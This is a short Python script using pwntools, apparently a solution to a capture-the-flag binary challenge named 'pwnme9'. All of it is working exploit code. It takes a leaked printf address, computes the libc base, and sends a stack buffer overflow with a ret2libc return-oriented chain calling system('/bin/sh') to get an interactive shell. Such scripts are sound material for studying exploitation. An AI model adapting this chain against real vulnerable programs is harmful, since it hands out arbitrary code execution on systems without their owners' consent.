from pwn import *

p = process(['stdbuf', '-o0', './pwnme9'])

printf_off = 0x60100
system_off = 0x58750
binsh_off  = 0x1cb42f
pop_rdi    = 0x10f78b
ret        = 0x3d4

p.recvuntil(b'... ')
leaked = int(p.recvline().strip(), 16)
log.info(f"printf @ {hex(leaked)}")

libc_base  = leaked - printf_off
system     = libc_base + system_off
binsh      = libc_base + binsh_off
pop_rdi_rt = libc_base + pop_rdi
ret_gadget = libc_base + ret

log.info(f"libc base @ {hex(libc_base)}")
log.info(f"system    @ {hex(system)}")

payload  = b'A' * 88
payload += p64(ret_gadget)
payload += p64(ret_gadget)
payload += p64(pop_rdi_rt)
payload += p64(binsh)
payload += p64(system)

p.sendline(payload)
p.interactive()
